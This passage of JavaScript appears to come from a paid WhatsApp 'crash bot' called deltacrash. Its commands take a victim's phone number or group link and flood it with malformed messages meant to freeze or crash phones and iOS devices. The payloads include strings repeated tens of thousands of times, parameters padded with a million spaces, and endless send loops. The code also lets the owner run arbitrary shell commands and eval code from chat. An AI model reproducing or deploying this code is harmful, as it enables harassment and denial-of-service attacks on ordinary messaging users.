if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 10; j++) {
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'bug-list': {
if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}
reply(`Successfully Sent Bug To ${victim}`)
}
break
case 'bug-list': {
if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-external': {


if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-internal': {


if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-engine': {


if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-crash': {


if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
//=================================================//
case 'delta1': case 'dark': case '💀': case 'satan': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 1; j++) {
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'wtf': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 1; j++) {
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break

case 'metaverse': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 1; j++) {
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
await xeonkillpic(target, oneclickxeon)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
await xeonkillpic(target, oneclickxeon)
await locationxeony(target, force)
await blackening(target, force2)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await pirgam(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'unlimited-bug': case '😈': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (;;) {
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await baklis(target, deltanotfoundvault)
await ngeloc(target, deltaxcrashcrash)
await sleep(30000)
}
}
break
case 'lockbit': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')

if (!m.quoted) return reply(`Example usage: ${prefix + command} reply chat`)

await deltaxcrash.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363622395675672@newsletter', newsletterName: `𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })

await sleep(2000)

await deltaxcrash.sendMessage(m.chat, { react: { text: '🐛', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })

}

break        
case 'vivo-react': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')

if (!m.quoted) return reply(`Example usage: ${prefix + command} reply chat`)

await deltaxcrash.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363622395675672@newsletter', newsletterName: `𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })

await sleep(2000)

await deltaxcrash.sendMessage(m.chat, { react: { text: '🐛', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })

}

break        
        case 'satanic': {


if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
case 'vivo-list': {


if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await deltaxcrash.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
//=================================================//
case 'phone-crash': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
  for (;;) {
    await ngeloc(target, deltanotfoundvault)
  }
}
break
//=================================================//
case 'ios-unlimited': case 'infinity-war': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
await reply(`_</> successfully send bug to target_`)
let target = bijipler + '@s.whatsapp.net'
  for (;;) {
    await deltaxcrashiphone(target)
    await sleep(1200)
  }
}
break
//=================================================//
case 'infinity-warcrash': case 'infinity-good': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
m.reply(ppk + " detik");
reply(`_</> successfully send bug to target_`)
for (let j = 0; j < jumlah; j++) {
await deltaxcrashiphone(target)
await sleep(1500)
}
reply(`👤 Succes Send Bug Ke ${target} dalam kurun waktu ${ppk} detik`)
}
break
//=================================================//
case 'bug-button': case 'bug-worm': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
reply(`_</> successfully send bug to target_`)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await deltaxcrash.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: deltanotfoundvault })
await deltaxcrash.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'button-internal': case 'button-external': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
reply(`_</> successfully send bug to target_`)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await deltaxcrash.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: deltanotfoundvault })
await deltaxcrash.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'enemygroup': case 'bug-hole': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 1962623836281@g.us`)
reply(`_</> successfully send bug to target_`)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: deltanotfoundvault })
await deltaxcrash.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'internal-group': case 'external-group': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} <idgroup@g.us>`)
reply(`_</> successfully send bug to target_`)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: deltanotfoundvault })
await deltaxcrash.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break

     case 'gegegememejsbsbsksvsj':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return reply("Khusus Grup")
var ini = pler.indexOf(m.chat)
pler.splice(ini, 1)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
reply(`${command} berhasil nonaktif`)
break
case 'gegegememejsbsbsksvsj':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return reply("Khusus Grup")
pler.push(m.chat)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
reply(`${command} berhasil aktif`)
default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return deltaxcrash.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return deltaxcrash.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
deltaxcrash.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
deltaxcrash.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return deltaxcrash.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return deltaxcrash.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
deltaxcrash.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}

dari: ${m.sender.split("@")[0]}`}, {quoted: m})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})